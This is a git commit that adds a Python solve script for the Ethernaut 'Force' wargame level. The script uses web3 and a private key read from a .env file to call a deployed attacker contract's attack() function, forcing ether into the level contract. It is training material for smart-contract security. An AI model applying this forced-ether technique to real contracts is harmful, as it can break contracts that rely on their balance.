60a372ed46d79d85f3236e02bfb8c011df2c64dd
swollows <swollows9081@gmail.com>
2025-01-06 00:53:08 +0900

    Add write up (Ethernaut / 07. force)

---
+++ Wargame/ethernaut/07_force/solve.py
@@ -0,0 +1,96 @@
+from web3 import Web3
+
+# 풀이
+# 1. 
+
+# 문제에서 사용하는 각종 정보 추출
+def parse_env_to_dict(env_file_path):
+    env_dict = {}
+
+    # Read the .env file line by line
+    with open(env_file_path, "r") as file:
+        for line in file:
+            # Strip whitespace and ignore comments or empty lines
+            line = line.strip()
+            if not line or line.startswith("#"):
+                continue
+
+            # Split key and value on the first '='
+            key, _, value = line.partition("=")
+            key = key.strip()
+            value = value.strip()
+
+            # Remove quotes from the value if present
+            if (value.startswith('"') and value.endswith('"')) or (value.startswith("'") and value.endswith("'")):
+                value = value[1:-1]
+
+            # Add to dictionary
+            env_dict[key] = value
+
+    return env_dict
+
+ENV_PATH = "../.env"
+
+dict_output = parse_env_to_dict(ENV_PATH)
+
+RPC_URI = dict_output['WEB3_PROVIDER_URI']
+
+
+CONTRACT_ADDRESS = '0xDc3cC092347a9c43Ac03A6b280D0e4f5cF1405AE'
+ATTACKER_ADDRESS = '0x575CDC94F53b083a05dbB2cC8F89613581Ef42F0'
+LEVEL_ADDRESS = '0x' + dict_output['ETHERNAUT_LEVEL07_ADDRESS']
+USER_PRIVATE_KEY = '0x' + dict_output['FIRST_USER_ADDRESS_PRIVATE_KEY']
+
+web3 = Web3(Web3.HTTPProvider(RPC_URI))
+
+# 연결 확인
+if web3.is_connected():
+    print("Connected to Seth!")
+else:
+    print("Failed to connect to Seth.")
+    
+PA = web3.eth.account.from_key(USER_PRIVATE_KEY)
+USER_ADDRESS = PA.address
+
+ATTACKER_ABI = [
+  {
+    "inputs": [
+      {
+        "internalType": "contract Force",
+        "name": "_forceContract",
+        "type": "address"
+      }
+    ],
+    "stateMutability": "nonpayable",
+    "type": "constructor"
+  },
+  {
+    "inputs": [],
+    "name": "attack",
+    "outputs": [],
+    "stateMutability": "payable",
+    "type": "function"
+  }
+]
+
+attacker = web3.eth.contract(address=ATTACKER_ADDRESS, abi=ATTACKER_ABI)
+
+# 컨트랙트를 통한 송금 실시
+data = {
+    'value': 1,
+    'gas': 300000,
+    'gasPrice': web3.eth.gas_price,
+    'nonce': web3.eth.get_transaction_count(USER_ADDRESS),
+}
+
+tx = attacker.functions.attack().build_transaction(data)
+
+# 트랜젝션 서명 및 전송
+signed_tx = web3.eth.account.sign_transaction(tx, USER_PRIVATE_KEY)
+tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
+
+print(f"Transaction Hash: {web3.to_hex(tx_hash)}")
+
+# 트랜잭션 결과 확인
+tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
+print(f"Transaction Receipt: {tx_receipt}")
